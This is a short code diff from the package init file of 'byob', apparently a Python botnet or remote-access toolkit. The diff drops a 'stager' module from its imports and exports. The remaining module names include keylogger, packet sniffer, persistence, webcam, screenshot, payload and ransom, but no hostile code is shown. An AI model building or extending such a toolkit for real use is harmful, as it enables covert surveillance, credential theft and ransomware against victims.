@@ -17,9 +17,9 @@ Copyright (c) 2018 Daniel Vega-Myhre
                d8'
 
 """
-import crypto, email, keylogger, outlook, packetsniffer, payload, persistence, phone, portscan, screenshot, stager, task, util, webcam
+import crypto, email, keylogger, outlook, packetsniffer, payload, persistence, phone, portscan, screenshot, task, util, webcam
 
-__all__         = ['crypto', 'keylogger', 'outlook', 'packetsniffer', 'payload', 'persistence', 'phone', 'portscan', 'ransom', 'screenshot', 'stager', 'task', 'util', 'webcam']
+__all__         = ['crypto', 'keylogger', 'outlook', 'packetsniffer', 'payload', 'persistence', 'phone', 'portscan', 'ransom', 'screenshot', 'task', 'util', 'webcam']
 __package__ 	= 'byob'
 __author__      = 'Daniel Vega-Myhre'
 __license__ 	= 'GPLv3'
